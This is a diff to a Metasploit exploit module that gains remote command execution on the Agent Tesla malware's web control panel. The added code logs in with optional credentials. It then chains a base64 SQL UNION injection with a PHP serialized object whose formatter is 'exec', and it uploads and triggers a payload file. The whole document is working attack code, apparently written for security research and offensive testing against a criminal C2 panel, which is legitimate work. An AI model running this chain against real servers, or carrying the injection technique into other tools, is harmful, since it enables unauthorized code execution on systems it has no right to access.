@@ -6,26 +6,33 @@
 class MetasploitModule < Msf::Exploit::Remote
   Rank = ExcellentRanking
 
+  include Msf::Exploit::FileDropper
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
       'Name' => 'Agent Tesla Panel Remote Code Execution',
       'Description' => %q{
-        This module exploit the command injection vulnerability in control center of the agent Tesla.
+        This module exploit a command injection vulnerability (authenticated and unauthenticated)
+        in the control center of the agent Tesla.
+
+        The Unauthenticated RCE is possible by mixing two vulnerabilities (SQLi + PHP Object Injection).
+        By observing other sources of this panel find on the Internet to watch the patch, I concluded
+        that the vulnerability is transfomed to an Authenticated RCE.
       },
       'Author' => [
         'Ege Balcı <ege.balci@invictuseurope.com>', # discovery and independent module
-        'mekhalleh (RAMELLA Sébastien)' # add. targetting windows
+        'mekhalleh (RAMELLA Sébastien)' # add. targetting windows and authenticated RCE
       ],
       'References' => [
-        ['URL', 'https://github.com/mekhalleh/agent_tesla_panel_rce/tree/master/resources'], # Agent-Tesla WebPanel available for download
+        ['URL', 'https://github.com/mekhalleh/agent_tesla_panel_rce/tree/master/resources'], # Agent-Tesla WebPanel's available for download
+        ['URL', 'https://www.pirates.re/agent-tesla-remote-command-execution-(fighting-the-webpanel)'], # fr
         ['URL', 'https://www.cyber.nj.gov/threat-profiles/trojan-variants/agent-tesla'],
         ['URL', 'https://krebsonsecurity.com/2018/10/who-is-agent-tesla/']
       ],
       'DisclosureDate' => '2018-07-10',
       'License' => MSF_LICENSE,
-      'Platform' => ['unix', 'windows'],
+      'Platform' => ['php', 'unix', 'windows'],
       'Arch' => [ARCH_CMD, ARCH_PHP],
       'Privileged' => true,
       'Targets' => [
@@ -63,8 +70,18 @@ class MetasploitModule < Msf::Exploit::Remote
     ))
 
     register_options([
-      OptString.new('TARGETURI', [true, 'The URI of the tesla agent with panel path', '/WebPanel/'])
+      OptString.new('PASSWORD', [false, 'The Agent Tesla CnC password to authenticate with']),
+      OptString.new('TARGETURI', [true, 'The URI of the tesla agent with panel path', '/WebPanel/']),
+      OptString.new('USERNAME', [false, 'The Agent Tesla CnC username to authenticate with'])
     ])
+  end
+
+  def setup
+    # check for login credentials couple.
+    if ((datastore['USERNAME']) && (datastore['PASSWORD'].nil?)) ||
+       ((datastore['PASSWORD']) && (datastore['USERNAME'].nil?))
+       fail_with(Failure::BadConfig, 'Bad login credentials couple')
+    end
   end
 
   def get_os
@@ -87,7 +104,7 @@ class MetasploitModule < Msf::Exploit::Remote
   def parse_response(js)
     return false unless js
     json = JSON.parse(sanitize_json(js.body))
-    return "#{json['data'][0]['username']}"
+    return "#{json['data'][0]['HWID']}"
   rescue
     return false
   end
@@ -100,17 +117,28 @@ class MetasploitModule < Msf::Exploit::Remote
 
   def execute_command(command)
     junk = rand(1_000)
-    response = send_request_cgi(
+    requested_payload = {
+      'table' => 'passwords',
+      'primary' => 'HWID',
+      'clmns' => 'a:1:{i:0;a:3:{s:2:"db";s:4:"HWID";s:2:"dt";s:4:"HWID";s:9:"formatter";s:4:"exec";}}',
+      'where' => Rex::Text.encode_base64("#{junk}=#{junk} UNION SELECT \"#{command}\"")
+    }
+
+    cookie = get_auth
+    request = {
       'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', 'server_processing.php'),
+      'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', 'server_processing.php')
+    }
+    if cookie != :not_auth
+      request = request.merge({'cookie' => cookie})
+    end
+
+    request = request.merge({
       'encode_params' => true,
-      'vars_get' => {
-        'table' => 'passwords',
-        'primary' => 'password_id',
-        'clmns' => 'a:1:{i:0;a:3:{s:2:"db";s:3:"pwd";s:2:"dt";s:8:"username";s:9:"formatter";s:4:"exec";}}',
-        'where' => Rex::Text.encode_base64("#{junk}=#{junk} UNION SELECT \"#{command}\"")
-      }
-    )
+      'vars_get' => requested_payload
+    })
+
+    response = send_request_cgi(request)
     if (response) && (response.body)
       return response
     end
@@ -118,7 +146,36 @@ class MetasploitModule < Msf::Exploit::Remote
     return false
   end
 
+  def get_auth
+    if datastore['USERNAME'] && datastore['PASSWORD']
+      response = send_request_cgi(
+        'method' => 'POST',
+        'uri' => normalize_uri(target_uri.path, 'login.php'),
+        'vars_post' => {
+          'Username' => datastore['USERNAME'],
+          'Password' => datastore['PASSWORD']
+        }
+      )
+      if (response) && (response.code == 302) && (response.headers['location'] =~ /index.php/)
+        return response.get_cookies
+      end
+    end
+
+    return :not_auth
+  end
+
   def check
+    received = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', 'server_processing.php')
+    )
+    if (received) && (received.code == 302) && (received.headers['location'] =~ /login.php/)
+      unless datastore['USERNAME'] && datastore['PASSWORD']
+        print_warning("Unauthenticated RCE can't be exploited, retry if you gain CnC credentials.")
+        return Exploit::CheckCode::Unknown
+      end
+    end
+
     rand_str = Rex::Text.rand_text_alpha(8)
     received = parse_response(execute_command("echo #{rand_str}"))
     if (received) && (received.include?(rand_str))
@@ -172,11 +229,13 @@ class MetasploitModule < Msf::Exploit::Remote
         return(Msf::Exploit::Failed)
       end
       print_status("Payload uploaded as: #{file_name}")
+      register_file_for_cleanup file_name
 
       ## Triggering.
       send_request_cgi({
         'method' => 'GET',
-        'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', file_name)
+        'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', file_name),
+        'agent' => datastore['USERAGENT']
       }, 2.5)
     end
   end
